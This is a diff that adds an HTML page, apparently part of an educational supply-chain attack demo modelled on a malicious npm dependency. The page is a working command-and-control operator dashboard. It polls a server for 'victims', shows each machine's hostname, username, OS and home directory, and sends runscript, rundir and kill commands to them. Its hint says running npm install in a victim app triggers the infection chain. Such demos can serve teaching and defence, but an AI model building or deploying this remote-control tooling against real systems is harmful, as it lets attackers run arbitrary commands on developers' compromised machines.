@@ -1,0 +1,265 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <title>C2 Operator Dashboard — Educational Demo</title>
+  <style>
+    * { margin: 0; padding: 0; box-sizing: border-box; }
+    body {
+      font-family: "SF Mono", "Fira Code", "Consolas", monospace;
+      background: #0a0a0a;
+      color: #e0e0e0;
+      padding: 24px;
+    }
+    h1 {
+      color: #ff4444;
+      font-size: 18px;
+      margin-bottom: 4px;
+    }
+    .subtitle {
+      color: #666;
+      font-size: 12px;
+      margin-bottom: 24px;
+    }
+    .victims {
+      display: flex;
+      flex-direction: column;
+      gap: 16px;
+    }
+    .victim-card {
+      background: #141414;
+      border: 1px solid #222;
+      border-radius: 8px;
+      padding: 16px;
+    }
+    .victim-header {
+      display: flex;
+      align-items: center;
+      gap: 10px;
+      margin-bottom: 12px;
+    }
+    .status-dot {
+      width: 10px;
+      height: 10px;
+      border-radius: 50%;
+      flex-shrink: 0;
+    }
+    .status-dot.active { background: #00ff66; box-shadow: 0 0 6px #00ff6688; }
+    .status-dot.inactive { background: #ff3333; }
+    .victim-id {
+      color: #ff9900;
+      font-weight: bold;
+      font-size: 14px;
+    }
+    .victim-meta {
+      color: #888;
+      font-size: 12px;
+    }
+    .fingerprint {
+      display: grid;
+      grid-template-columns: repeat(auto-fill, minmax(180px, 1fr));
+      gap: 4px 16px;
+      font-size: 11px;
+      color: #777;
+      margin-bottom: 12px;
+      padding: 8px;
+      background: #0d0d0d;
+      border-radius: 4px;
+    }
+    .fingerprint span { color: #aaa; }
+    .command-bar {
+      display: flex;
+      gap: 8px;
+      margin-bottom: 12px;
+    }
+    .command-bar select, .command-bar input, .command-bar button {
+      font-family: inherit;
+      font-size: 13px;
+      padding: 6px 10px;
+      border-radius: 4px;
+      border: 1px solid #333;
+      background: #1a1a1a;
+      color: #e0e0e0;
+    }
+    .command-bar input {
+      flex: 1;
+    }
+    .command-bar button {
+      background: #ff4444;
+      border-color: #ff4444;
+      color: #fff;
+      cursor: pointer;
+      font-weight: bold;
+    }
+    .command-bar button:hover { background: #cc3333; }
+    .results {
+      max-height: 300px;
+      overflow-y: auto;
+    }
+    .result-entry {
+      background: #0d0d0d;
+      border-left: 3px solid #333;
+      padding: 8px 12px;
+      margin-bottom: 6px;
+      border-radius: 0 4px 4px 0;
+      font-size: 12px;
+    }
+    .result-entry .cmd {
+      color: #ff9900;
+      margin-bottom: 4px;
+    }
+    .result-entry .output {
+      color: #ccc;
+      white-space: pre-wrap;
+      word-break: break-all;
+    }
+    .result-entry .time {
+      color: #555;
+      font-size: 10px;
+      margin-top: 4px;
+    }
+    .no-victims {
+      color: #555;
+      text-align: center;
+      padding: 60px 20px;
+      font-size: 14px;
+    }
+    .no-victims .hint {
+      color: #333;
+      font-size: 12px;
+      margin-top: 8px;
+    }
+    .pending-badge {
+      background: #ff9900;
+      color: #000;
+      font-size: 10px;
+      padding: 2px 6px;
+      border-radius: 3px;
+      font-weight: bold;
+    }
+  </style>
+</head>
+<body>
+
+  <h1>C2 OPERATOR DASHBOARD</h1>
+  <div class="subtitle">Educational supply chain attack demo — axios/plain-crypto-js pattern</div>
+
+  <div id="victims" class="victims">
+    <div class="no-victims">
+      Waiting for victims...<br>
+      <span class="hint">Run <code>npm install</code> in victim-app/ to trigger the chain</span>
+    </div>
+  </div>
+
+  <script>
+    const REFRESH_MS = 2000;
+
+    async function fetchVictims() {
+      try {
+        const res = await fetch("/api/victims");
+        return await res.json();
+      } catch {
+        return [];
+      }
+    }
+
+    async function sendCommand(victimId, type, args) {
+      await fetch("/api/command", {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({ victimId, type, args }),
+      });
+    }
+
+    function formatTime(ts) {
+      return new Date(ts).toLocaleTimeString();
+    }
+
+    function renderVictims(victims) {
+      const container = document.getElementById("victims");
+
+      if (victims.length === 0) {
+        container.innerHTML = `
+          <div class="no-victims">
+            Waiting for victims...<br>
+            <span class="hint">Run <code>npm install</code> in victim-app/ to trigger the chain</span>
+          </div>`;
+        return;
+      }
+
+      container.innerHTML = victims.map((v) => {
+        const active = v.secondsAgo < 10;
+        const fp = v.fingerprint || {};
+
+        const resultsHtml = (v.results || [])
+          .slice()
+          .reverse()
+          .map(
+            (r) => `
+          <div class="result-entry">
+            <div class="cmd">&gt; ${escapeHtml(r.command)}</div>
+            <div class="output">${escapeHtml(r.output)}</div>
+            <div class="time">${formatTime(r.timestamp)}</div>
+          </div>`
+          )
+          .join("");
+
+        return `
+        <div class="victim-card">
+          <div class="victim-header">
+            <div class="status-dot ${active ? "active" : "inactive"}"></div>
+            <span class="victim-id">${v.victimId}</span>
+            <span class="victim-meta">
+              ${escapeHtml(fp.hostname || "?")}@${escapeHtml(fp.username || "?")}
+              — ${escapeHtml(fp.platform || "?")}/${escapeHtml(fp.arch || "?")}
+              — ${v.secondsAgo}s ago
+            </span>
+            ${v.hasPending ? '<span class="pending-badge">CMD PENDING</span>' : ""}
+          </div>
+          <div class="fingerprint">
+            <div>OS: <span>${escapeHtml(fp.osVersion || "?")}</span></div>
+            <div>CPUs: <span>${fp.cpus || "?"}</span></div>
+            <div>Memory: <span>${escapeHtml(fp.totalMem || "?")}</span></div>
+            <div>Uptime: <span>${fp.uptime ? Math.round(fp.uptime / 60) + "m" : "?"}</span></div>
+            <div>Home: <span>${escapeHtml(fp.homeDir || "?")}</span></div>
+          </div>
+          <div class="command-bar">
+            <select id="type-${v.victimId}">
+              <option value="runscript">runscript</option>
+              <option value="rundir">rundir</option>
+              <option value="kill">kill</option>
+            </select>
+            <input id="args-${v.victimId}" type="text" placeholder="command or path..."
+                   onkeydown="if(event.key==='Enter') document.getElementById('send-${v.victimId}').click()" />
+            <button id="send-${v.victimId}" onclick="handleSend('${v.victimId}')">SEND</button>
+          </div>
+          <div class="results">${resultsHtml || '<div style="color:#333;font-size:12px">No results yet</div>'}</div>
+        </div>`;
+      }).join("");
+    }
+
+    function escapeHtml(str) {
+      const div = document.createElement("div");
+      div.textContent = str;
+      return div.innerHTML;
+    }
+
+    async function handleSend(victimId) {
+      const type = document.getElementById(`type-${victimId}`).value;
+      const argsInput = document.getElementById(`args-${victimId}`);
+      const args = argsInput.value;
+      argsInput.value = "";
+      await sendCommand(victimId, type, args);
+    }
+
+    // Auto-refresh loop
+    async function loop() {
+      const victims = await fetchVictims();
+      renderVictims(victims);
+      setTimeout(loop, REFRESH_MS);
+    }
+
+    loop();
+  </script>
+</body>
+</html>
